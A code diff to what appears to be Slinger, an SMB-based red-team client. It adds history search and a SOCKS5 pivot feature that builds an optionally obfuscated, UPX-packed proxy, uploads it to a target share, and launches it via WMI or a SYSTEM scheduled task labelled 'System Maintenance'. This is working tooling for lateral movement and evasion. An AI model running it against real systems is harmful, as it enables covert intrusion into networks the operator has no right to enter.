@@ -401,12 +401,31 @@ class SlingerClient(
                 print_bad(f"History file not found: {hist_file}")
                 return
 
-            # Read history file
+            # Read history file — prompt_toolkit FileHistory format:
+            # lines starting with '+' are commands, '#' are timestamps, blank are separators
             with open(hist_file, "r") as f:
-                lines = f.readlines()
+                raw_lines = f.readlines()
+            lines = [ln[1:] for ln in raw_lines if ln.startswith("+")]
 
-            # Get the number of lines to display (default 15)
+            # Get the number of lines to consider
             num_lines = args.n if hasattr(args, "n") else 15
+
+            # Search filter
+            search_term = getattr(args, "search", None)
+            if search_term:
+                # Search through all history (or last N)
+                pool = lines[-num_lines:] if num_lines != 15 else lines
+                matches = []
+                for i, line in enumerate(pool, start=1):
+                    if search_term.lower() in line.lower():
+                        matches.append((i, line))
+                if matches:
+                    print_info(f"History matching '{search_term}' ({len(matches)} result(s)):")
+                    for idx, line in matches:
+                        print_log(f"{idx:4d}  {line.rstrip()}")
+                else:
+                    print_info(f"No history entries matching '{search_term}'")
+                return
 
             # Get last N lines
             history_lines = lines[-num_lines:]
@@ -814,6 +833,687 @@ class SlingerClient(
 
         except Exception as e:
             print_bad(f"Failed to reconnect: {e}")
+
+    def proxy_handler(self, args):
+        """Handle SOCKS5 proxy commands."""
+        proxy_cmd = getattr(args, "proxy_command", None)
+
+        if proxy_cmd is None:
+            print_info("SOCKS5 Proxy Tunnel")
+            print_log("")
+            print_log("Available Commands:")
+            print_log("  build    - Build SOCKS5 proxy binary")
+            print_log("  deploy   - Deploy proxy to target")
+            print_log("  start    - Start a deployed proxy process")
+            print_log("  connect  - Connect to proxy and start local SOCKS5 listener")
+            print_log("  use      - Re-enter proxy subshell (after 'back')")
+            print_log("  stop     - Kill proxy process on target")
+            print_log("  rm       - Remove proxy file from target")
+            print_log("  list     - List deployed proxies")
+            print_log("")
+            print_info("Use 'proxy <command> --help' for detailed help")
+            return
+
+        if proxy_cmd == "build":
+            self._proxy_build(args)
+        elif proxy_cmd == "deploy":
+            self._proxy_deploy(args)
+        elif proxy_cmd == "start":
+            self._proxy_start(args)
+        elif proxy_cmd == "connect":
+            self._proxy_connect(args)
+        elif proxy_cmd == "use":
+            self._proxy_use(args)
+        elif proxy_cmd == "stop":
+            self._proxy_stop(args)
+        elif proxy_cmd == "rm":
+            self._proxy_rm(args)
+        elif proxy_cmd == "list":
+            self._proxy_list(args)
+
+    def _proxy_build(self, args):
+        """Build SOCKS5 proxy binary."""
+        from slingerpkg.lib.proxy_builder import ProxyBuilder
+
+        # Find project base path (where lib/agent_templates/ lives)
+        base_path = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+        # Check if templates exist at this path
+        template_dir = os.path.join(base_path, "lib", "agent_templates")
+        if not os.path.exists(template_dir):
+            # Try relative to the package install location
+            base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+            template_dir = os.path.join(base_path, "..", "..", "lib", "agent_templates")
+            base_path = os.path.abspath(os.path.join(base_path, "..", ".."))
+
+        if not os.path.exists(os.path.join(base_path, "lib", "agent_templates", "proxy_main.cpp")):
+            print_bad(f"Proxy templates not found at {base_path}/lib/agent_templates/")
+            return
+
+        if getattr(args, "dry_run", False):
+            builder = ProxyBuilder(base_path, debug=True)
+            deps = builder.check_build_dependencies()
+            print_info("Build dependency check:")
+            print_info(f"  CMake: {'OK' if deps.get('cmake') else 'MISSING'}")
+            print_info(f"  C++ compiler: {'OK' if deps.get('cpp_compiler') else 'MISSING'}")
+            if deps.get("compiler_found"):
+                print_info(f"  Compiler found: {deps['compiler_found']}")
+            return
+
+        builder = ProxyBuilder(base_path, debug=getattr(args, "proxy_debug", False))
+
+        arch_list = ["x86", "x64"] if args.arch == "both" else [args.arch]
+        for arch in arch_list:
+            result = builder.build_proxy(
+                arch=arch,
+                custom_pipe_name=args.pipe,
+                passphrase=getattr(args, "passphrase", None),
+                obfuscate=getattr(args, "obfuscate", False),
+                upx_path=getattr(args, "upx", None),
+                custom_binary_name=getattr(args, "custom_name", None),
+                debug=getattr(args, "proxy_debug", False),
+            )
+            if result:
+                print_good(f"Build complete: {result}")
+
+    def _proxy_deploy(self, args):
+        """Deploy proxy binary to target."""
+        if not self.check_if_connected():
+            return
+
+        proxy_file = args.proxy_file
+        if not os.path.exists(proxy_file):
+            print_bad(f"File not found: {proxy_file}")
+            return
+
+        # Upload via SMB
+        raw_path = getattr(args, "path", None)
+        if raw_path is not None:
+            # User explicitly set --path — clean up quotes but preserve root "\"
+            remote_dir = raw_path.strip().strip('"').strip("'")
+            remote_dir = remote_dir.strip("\\")
+            # remote_dir is now "" for root, or "Temp" for \Temp\, etc.
+        else:
+            remote_dir = self._get_default_output_path().strip("\\")
+
+        proxy_name = args.name
+        remote_filename = f"{proxy_name}.exe" if not proxy_name.endswith(".exe") else proxy_name
+        remote_path = f"{remote_dir}\\{remote_filename}" if remote_dir else remote_filename
+
+        print_info(f"Uploading {proxy_file} to {self.share}\\{remote_path}")
+
+        try:
+            saved_rp = self.relative_path
+            self.relative_path = ""
+            self.upload(proxy_file, remote_path)
+            self.relative_path = saved_rp
+            print_good(f"Proxy deployed: {remote_path}")
+            self._track("FILE", "proxy_deploy", f"{self.share}\\{remote_path}", proxy_name)
+        except Exception as e:
+            print_bad(f"Upload failed: {e}")
+            return
+
+        # Save deployment info
+        self._save_proxy_deployment(
+            proxy_name, remote_path, self.share, getattr(args, "pipe", None), proxy_file
+        )
+
+        # Start if requested — uses same flow as agent start
+        if getattr(args, "start", False):
+            method = getattr(args, "method", "wmiexec")
+            share_info = self.list_shares(args=None, echo=False, ret=True)
+            abs_path = None
+            if share_info:
+                for si in share_info:
+                    if si["name"].upper() == self.share.upper():
+                        abs_path = f"{si['path'].rstrip(chr(92))}\\{remote_path}"
+                        break
+
+            if not abs_path:
+                abs_path = remote_path
+
+            result = self._start_agent_process(abs_path, method=method, args=args)
+            if result.get("success"):
+                pid = result.get("process_id")
+                if pid:
+                    print_good(f"Proxy started (PID: {pid})")
+                else:
+                    print_good(f"Proxy start task executed")
+                self._track("EXEC", "proxy_start", proxy_name, f"method={method}")
+                # Save start method in registry for stop to reuse
+                self._update_proxy_registry(proxy_name, {"start_method": method})
+            else:
+                print_bad(f"Failed to start proxy: {result.get('error', 'unknown')}")
+
+    def _proxy_connect(self, args):
+        """Connect to running proxy and start local SOCKS5 listener."""
+        if not self.check_if_connected():
+            return
+
+        from slingerpkg.lib.socks_proxy import SocksProxyServer
+
+        proxy_id = args.proxy_id
+        port = args.port
+        bind_host = args.bind
+
+        # Look up pipe name from deployment registry
+        registry = self._load_proxy_registry()
+        proxy_info = registry.get(proxy_id)
+        pipe_name = None
+        if proxy_info:
+            pipe_name = proxy_info.get("pipe_name")
+
+        if not pipe_name:
+            pipe_name = proxy_id  # Use proxy_id as pipe name directly
+
+        # Connect to IPC$ and open the named pipe
+        print_info(f"Connecting to proxy pipe: {pipe_name}")
+        try:
+            ipc_tid = self.conn.connectTree("IPC$")
+            pipe_path = f"\\{pipe_name}"
+            pipe_fid = self.conn.openFile(ipc_tid, pipe_path)
+        except Exception as e:
+            print_bad(f"Failed to open pipe '{pipe_name}': {e}")
+            print_info("Ensure the proxy is running on target")
+            return
+
+        # Read ACK handshake (PipeCore sends [length:4][type:4][XOR-encoded "ACK"])
+        try:
+            # Read PipeMessage header (8 bytes) + body
+            header = self.conn.readFile(ipc_tid, pipe_fid, 0, 8)
+            if not header or len(header) < 8:
+                print_bad("No handshake from proxy")
+                self.conn.closeFile(ipc_tid, pipe_fid)
+                self.conn.disconnectTree(ipc_tid)
+                return
+            import struct
+
+            msg_len = struct.unpack("<I", bytes(header[0:4]))[0]
+            if msg_len > 0:
+                ack_body = self.conn.readFile(ipc_tid, pipe_fid, 0, msg_len)
+                print_debug(f"Handshake ACK received: {len(ack_body)} bytes")
+            print_good("Connected to proxy")
+        except Exception as e:
+            print_bad(f"Handshake failed: {e}")
+            print_info("The proxy process may have crashed. Rebuild with --debug for logs")
+            try:
+                self.conn.closeFile(ipc_tid, pipe_fid)
+                self.conn.disconnectTree(ipc_tid)
+            except Exception:
+                pass
+            return
+
+        # Authenticate if needed — use --pass flag or auto-detect from registry
+        passphrase = getattr(args, "passphrase", None)
+        if not passphrase and proxy_info and proxy_info.get("auth_enabled"):
+            passphrase = proxy_info.get("passphrase")
+            if passphrase:
+                print_debug("Using passphrase from deployment registry")
+            else:
+                print_bad("Proxy requires authentication but no passphrase found")
+                print_info("Use --pass <passphrase> to authenticate")
+                try:
+                    self.conn.closeFile(ipc_tid, pipe_fid)
+                    self.conn.disconnectTree(ipc_tid)
+                except Exception:
+                    pass
+                return
+        if passphrase:
+            try:
+                from slingerpkg.lib.agent_crypto import AgentAuthProtocol
+                import struct
+
+                print_info("Authenticating...")
+
+                # Read 16-byte nonce from proxy
+                nonce_data = self.conn.readFile(ipc_tid, pipe_fid, 0, 16)
+                if not nonce_data or len(nonce_data) != 16:
+                    print_bad(
+                        f"Failed to receive auth nonce (got {len(nonce_data) if nonce_data else 0} bytes)"
+                    )
+                    self.conn.closeFile(ipc_tid, pipe_fid)
+                    self.conn.disconnectTree(ipc_tid)
+                    return
+
+                nonce = bytes(nonce_data)
+                print_debug(f"Received nonce: {nonce.hex()}")
+
+                # Compute HMAC and derive session key
+                auth = AgentAuthProtocol()
+                hmac_response, session_key = auth.handle_challenge(nonce, passphrase)
+                auth.initialize_session(session_key)
+
+                # Send HMAC response (32 bytes)
+                self.conn.writeFile(ipc_tid, pipe_fid, hmac_response, 0)
+                print_good("Authentication successful")
+                print_debug(f"Session key derived, encrypted communication active")
+
+            except Exception as e:
+                print_bad(f"Authentication failed: {e}")
+                print_info("Ensure --pass matches the passphrase used during 'proxy build'")
+                try:
+                    self.conn.closeFile(ipc_tid, pipe_fid)
+                    self.conn.disconnectTree(ipc_tid)
+                except Exception:
+                    pass
+                return
+
+        # Start SOCKS5 server
+        proxy_server = SocksProxyServer(
+            self.conn, ipc_tid, pipe_fid, bind_host=bind_host, bind_port=port
+        )
+        proxy_server.start()
+        self._track("EXEC", "proxy_connect", proxy_id, f"socks5://{bind_host}:{port}")
+
+        # Block until user stops or backgrounds
+        user_action = "stop"
+        try:
+            while proxy_server.running:
+                cmd = input("proxy> ").strip().lower()
+                if cmd in ("stop", "exit", "quit"):
+                    user_action = "stop"
+                    break
+                elif cmd == "back":
+                    user_action = "back"
+                    break
+                elif cmd == "status":
+                    print_info(f"Active channels: {proxy_server.active_channels}")
+                    print_info(f"Listening on: {bind_host}:{port}")
+                elif cmd == "help":
+                    print_info("Proxy commands:")
+                    print_log("  status  - Show active tunnel count")
+                    print_log(
+                        "  back    - Return to main shell (proxy keeps running in background)"
+                    )
+                    print_log("  stop    - Shutdown proxy and return to main shell")
+                    print_log("  help    - Show this help")
+                elif cmd == "":
+                    pass
+                else:
+                    print_info("Unknown command. Type 'help' for available commands")
+        except (KeyboardInterrupt, EOFError):
+            print()
+            user_action = "stop"
+
+        if user_action == "back":
+            proxy_server.show_tunnel_logs = False  # suppress tunnel logs in main shell
+            print_info(f"Proxy running in background on {bind_host}:{port}")
+            print_info(
+                f"Use 'proxy use {proxy_id}' to re-enter, or 'proxy stop {proxy_id}' to kill"
+            )
+            self._active_proxy = proxy_server
+            self._active_proxy_pipe = (ipc_tid, pipe_fid)
+            self._active_proxy_id = proxy_id
+        else:
+            # Stop local SOCKS listener + send SHUTDOWN to remote proxy
+            proxy_server.stop()
+            self._track("EXEC", "proxy_disconnect", proxy_id)
+
+            # Close pipe with timeout
+            import threading
+
+            def _close_pipe():
+                try:
+                    self.conn.closeFile(ipc_tid, pipe_fid)
+                except Exception:
+                    pass
+                try:
+                    self.conn.disconnectTree(ipc_tid)
+                except Exception:
+                    pass
+
+            close_thread = threading.Thread(target=_close_pipe, daemon=True)
+            close_thread.start()
+            close_thread.join(timeout=3)
+
+            # Kill remote proxy process
+            self._kill_proxy_process(proxy_id)
+            self._active_proxy = None
+            self._active_proxy_pipe = None
+            self._active_proxy_id = None
+
+    def _proxy_start(self, args):
+        """Start a deployed proxy process."""
+        if not self.check_if_connected():
+            return
+
+        proxy_id = args.proxy_id
+        registry = self._load_proxy_registry()
+        proxy_info = registry.get(proxy_id)
+
+        if not proxy_info:
+            print_bad(f"Proxy '{proxy_id}' not found in registry")
+            print_info("Use 'proxy list' to see deployed proxies")
+            return
+
+        remote_path = proxy_info.get("remote_path")
+        if not remote_path:
+            print_bad(f"No remote path for proxy '{proxy_id}'")
+            return
+
+        # Resolve absolute disk path from share info
+        share_name = proxy_info.get("share", self.share)
+        share_info = self.list_shares(args=None, echo=False, ret=True)
+        abs_path = None
+        if share_info:
+            for si in share_info:
+                if si["name"].upper() == share_name.upper():
+                    abs_path = f"{si['path'].rstrip(chr(92))}\\{remote_path}"
+                    break
+
+        if not abs_path:
+            abs_path = remote_path
+
+        method = getattr(args, "method", "wmiexec")
+        result = self._start_agent_process(abs_path, method=method, args=args)
+        if result.get("success"):
+            pid = result.get("process_id")
+            if pid:
+                print_good(f"Proxy '{proxy_id}' started (PID: {pid})")
+            else:
+                print_good(f"Proxy '{proxy_id}' start task executed")
+            self._track("EXEC", "proxy_start", proxy_id, f"method={method}")
+            self._update_proxy_registry(proxy_id, {"start_method": method})
+        else:
+            print_bad(f"Failed to start proxy: {result.get('error', 'unknown')}")
+
+    def _proxy_use(self, args):
+        """Re-enter proxy subshell for a backgrounded proxy."""
+        proxy_id = args.proxy_id
+        active_id = getattr(self, "_active_proxy_id", None)
+
+        if not active_id or active_id != proxy_id:
+            print_bad(f"No active background proxy '{proxy_id}'")
+            print_info("Use 'proxy connect <name>' to connect to a proxy")
+            return
+
+        proxy_server = self._active_proxy
+        if not proxy_server or not proxy_server.running:
+            print_bad(f"Proxy '{proxy_id}' is no longer running")
+            self._active_proxy = None
+            self._active_proxy_id = None
+            return
+
+        proxy_server.show_tunnel_logs = True  # re-enable tunnel logs
+        print_info(
+            f"Re-entering proxy '{proxy_id}' (socks5://{proxy_server.bind_host}:{proxy_server.bind_port})"
+        )
+        print_info(f"Active channels: {proxy_server.active_channels}")
+
+        ipc_tid, pipe_fid = self._active_proxy_pipe
+
+        # Same subshell loop as connect
+        user_action = "stop"
+        try:
+            while proxy_server.running:
+                cmd = input("proxy> ").strip().lower()
+                if cmd in ("stop", "exit", "quit"):
+                    user_action = "stop"
+                    break
+                elif cmd == "back":
+                    user_action = "back"
+                    break
+                elif cmd == "status":
+                    print_info(f"Active channels: {proxy_server.active_channels}")
+                    print_info(f"Listening on: {proxy_server.bind_host}:{proxy_server.bind_port}")
+                elif cmd == "help":
+                    print_info("Proxy commands:")
+                    print_log("  status  - Show active tunnel count")
+                    print_log("  back    - Return to main shell (proxy keeps running)")
+                    print_log("  stop    - Shutdown proxy and return to main shell")
+                    print_log("  help    - Show this help")
+                elif cmd == "":
+                    pass
+                else:
+                    print_info("Unknown command. Type 'help' for available commands")
+        except (KeyboardInterrupt, EOFError):
+            print()
+            user_action = "stop"
+
+        if user_action == "back":
+            proxy_server.show_tunnel_logs = False
+            print_info(
+                f"Proxy running in background on {proxy_server.bind_host}:{proxy_server.bind_port}"
+            )
+        else:
+            proxy_server.stop()
+            self._track("EXEC", "proxy_disconnect", proxy_id)
+            import threading
+
+            def _close_pipe():
+                try:
+                    self.conn.closeFile(ipc_tid, pipe_fid)
+                except Exception:
+                    pass
+                try:
+                    self.conn.disconnectTree(ipc_tid)
+                except Exception:
+                    pass
+
+            close_thread = threading.Thread(target=_close_pipe, daemon=True)
+            close_thread.start()
+            close_thread.join(timeout=3)
+            self._kill_proxy_process(proxy_id)
+            self._active_proxy = None
+            self._active_proxy_pipe = None
+            self._active_proxy_id = None
+
+    def _update_proxy_registry(self, proxy_id, updates):
+        """Update fields in the proxy deployment registry."""
+        registry = self._load_proxy_registry()
+        if proxy_id in registry:
+            registry[proxy_id].update(updates)
+            self._save_proxy_registry(registry)
+
+    def _kill_proxy_process(self, proxy_id):
+        """Kill proxy process on target using the same method it was started with."""
+        registry = self._load_proxy_registry()
+        proxy_info = registry.get(proxy_id)
+
+        exe_name = None
+        if proxy_info:
+            remote_path = proxy_info.get("remote_path", "")
+            exe_name = remote_path.split("\\")[-1] if "\\" in remote_path else remote_path
+        if not exe_name:
+            exe_name = f"{proxy_id}.exe"
+
+        # Use the same method the proxy was started with
+        method = proxy_info.get("start_method", "wmiexec") if proxy_info else "wmiexec"
+
+        print_info(f"Killing proxy process: {exe_name} (via {method})")
+        cmd = f"taskkill /F /IM {exe_name}"
+
+        try:
+            if method == "atexec":
+                import argparse as _argparse
+                from slingerpkg.utils.common import generate_random_string
+
+                atexec_args = _argparse.Namespace(
+                    command=cmd,
+                    no_output=True,
+                    tn=f"SlingerTask_{generate_random_string(6, 8)}",
+                    ta="SYSTEM",
+                    td="System Maintenance",
+                    tf="\\Windows",
+                    sp=self._resolve_output_path(None),
+                    sn=None,
+                    wait=1,
+                    shell=False,
+                )
+                self.atexec(atexec_args)
+                print_good(f"Proxy '{proxy_id}' process killed")
+                self._track("EXEC", "proxy_stop", proxy_id, f"method={method}")
+            else:
+                result = self.execute_wmi_command(
+                    command=cmd,
+                    capture_output=True,
+                    timeout=15,
+                    working_dir=self.wmi_working_dir,
+                    shell="cmd",
+                )
+                if result.get("success"):
+                    print_good(f"Proxy '{proxy_id}' process killed")
+                    self._track("EXEC", "proxy_stop", proxy_id, f"method={method}")
+                else:
+                    print_debug(f"taskkill result: {result.get('output', '')}")
+        except Exception as e:
+            print_debug(f"Kill failed: {e}")
+
+    def _proxy_stop(self, args):
+        """Kill proxy process on target."""
+        if not self.check_if_connected():
+            return
+
+        proxy_id = args.proxy_id
+
+        # If there's an active proxy connection, disconnect it first
+        if (
+            getattr(self, "_active_proxy", None)
+            and getattr(self, "_active_proxy_id", None) == proxy_id
+        ):
+            self._active_proxy.stop()
+            pipe_info = getattr(self, "_active_proxy_pipe", None)
+            if pipe_info:
+                try:
+                    self.conn.closeFile(pipe_info[0], pipe_info[1])
+                    self.conn.disconnectTree(pipe_info[0])
+                except Exception:
+                    pass
+            self._active_proxy = None
+            self._active_proxy_pipe = None
+            self._active_proxy_id = None
+
+        self._kill_proxy_process(proxy_id)
+
+    def _proxy_rm(self, args):
+        """Remove proxy file from target."""
+        if not self.check_if_connected():
+            return
+
+        proxy_id = args.proxy_id
+        registry = self._load_proxy_registry()
+        proxy_info = registry.get(proxy_id)
+
+        if not proxy_info:
+            print_bad(f"Proxy '{proxy_id}' not found in registry")
+            return
+
+        remote_path = proxy_info.get("remote_path")
+        if remote_path:
+            try:
+                saved_rp = self.relative_path
+                self.relative_path = ""
+                self.delete(remote_path)
+                self.relative_path = saved_rp
+                print_good(f"Deleted {remote_path}")
+                self._track("FILE", "proxy_rm", f"{self.share}\\{remote_path}")
+            except Exception as e:
+                print_bad(f"Failed to delete: {e}")
+
+        # Remove from registry
+        del registry[proxy_id]
+        self._save_proxy_registry(registry)
+        print_good(f"Proxy '{proxy_id}' removed from registry")
+
+    def _proxy_list(self, args):
+        """List deployed proxies."""
+        registry = self._load_proxy_registry()
+        if not registry:
+            print_info("No proxies deployed")
+            return
+
+        if getattr(args, "format", "table") == "json":
+            import json
+
+            print(json.dumps(registry, indent=2))
+            return
+
+        from tabulate import tabulate
+
+        rows = []
+        for proxy_id, info in registry.items():
+            auth = info.get("passphrase", "")
+            auth_display = auth if auth else "(none)"
+            deployed = info.get("deployed_at", "")
+            # Trim to seconds
+            if "." in deployed:
+                deployed = deployed.split(".")[0]
+            rows.append(
+                [
+                    proxy_id,
+                    info.get("share", ""),
+                    info.get("remote_path", ""),
+                    info.get("pipe_name", ""),
+                    auth_display,
+                    deployed,
+                ]
+            )
+        print(
+            tabulate(
+                rows, headers=["Name", "Share", "Path", "Pipe", "Auth", "Deployed"], tablefmt="grid"
+            )
+        )
+
+    def _save_proxy_deployment(self, name, remote_path, share, pipe_name, local_file):
+        """Save proxy deployment info to registry."""
+        import json
+        import datetime
+        from pathlib import Path
+
+        registry = self._load_proxy_registry()
+
+        # Pull build info (pipe name, auth, passphrase) from build registry
+        auth_enabled = False
+        passphrase = None
+        build_registry_file = Path.home() / ".slinger" / "proxies" / "built_proxies.json"
+        if build_registry_file.exists():
+            try:
+                with open(build_registry_file) as f:
+                    builds = json.load(f)
+                local_basename = os.path.basename(local_file)
+                for build in reversed(builds):
+                    if build.get("filename") == local_basename:
+                        if not pipe_name:
+                            pipe_name = build.get("pipe_name")
+                        auth_enabled = build.get("auth_enabled", False)
+                        passphrase = build.get("passphrase")
+                        break
+            except Exception:
+                pass
+
+        registry[name] = {
+            "remote_path": remote_path,
+            "share": share,
+            "pipe_name": pipe_name or name,
+            "host": self.host,
+            "auth_enabled": auth_enabled,
+            "passphrase": passphrase,
+            "deployed_at": datetime.datetime.now().isoformat(),
+        }
+        self._save_proxy_registry(registry)
+
+    def _load_proxy_registry(self):
+        """Load proxy deployment registry."""
+        import json
+        from pathlib import Path
+
+        reg_file = Path.home() / ".slinger" / "proxies" / "deployed_proxies.json"
+        if reg_file.exists():
+            try:
+                with open(reg_file) as f:
+                    return json.load(f)
+            except Exception:
+                pass
+        return {}
+
+    def _save_proxy_registry(self, registry):
+        """Save proxy deployment registry."""
+        import json
+        from pathlib import Path
+
+        reg_dir = Path.home() / ".slinger" / "proxies"
+        reg_dir.mkdir(parents=True, exist_ok=True)
+        with open(reg_dir / "deployed_proxies.json", "w") as f:
+            json.dump(registry, f, indent=2)
 
     def agent_handler(self, args):
         """Handle agent commands for cooperative agent building"""
@@ -1395,6 +2095,8 @@ class SlingerClient(
                         "process_id": None,
                     }
 
+                self._track("TASK", "atexec_create", task_name, "created+deleted")
+
                 # Reconnect and run the task
                 self.dce_transport._connect("atsvc")
                 full_task_path = f"{task_folder}\\{task_name}"
@@ -1406,6 +2108,9 @@ class SlingerClient(
                         "error": f"Failed to run task (error {response['ErrorCode']})",
                         "process_id": None,
                     }
+
+                cmd_preview = (full_path[:80] + "...") if len(full_path) > 80 else full_path
+                self._track("EXEC", "atexec", cmd_preview)
 
                 # Reconnect and delete the task
                 self.dce_transport._connect("atsvc")
@@ -1497,6 +2202,8 @@ class SlingerClient(
                     "error": f"Failed to create task (error {response['ErrorCode']})",
                 }
 
+            self._track("TASK", "atexec_create", task_name, "created+deleted")
+
             # Reconnect and run the task
             self.dce_transport._connect("atsvc")
             full_task_path = f"{task_folder}\\{task_name}"
@@ -1508,6 +2215,10 @@ class SlingerClient(
                     "output": "",
                     "error": f"Failed to run task (error {response['ErrorCode']})",
                 }
+
+            cmd_preview = (command[:80] + "...") if len(command) > 80 else command
+            self._track("EXEC", "atexec", cmd_preview)
+            self._track("FILE", "atexec", output_path, "temp output (created+deleted)")
 
             # Reconnect and delete the task
             self.dce_transport._connect("atsvc")
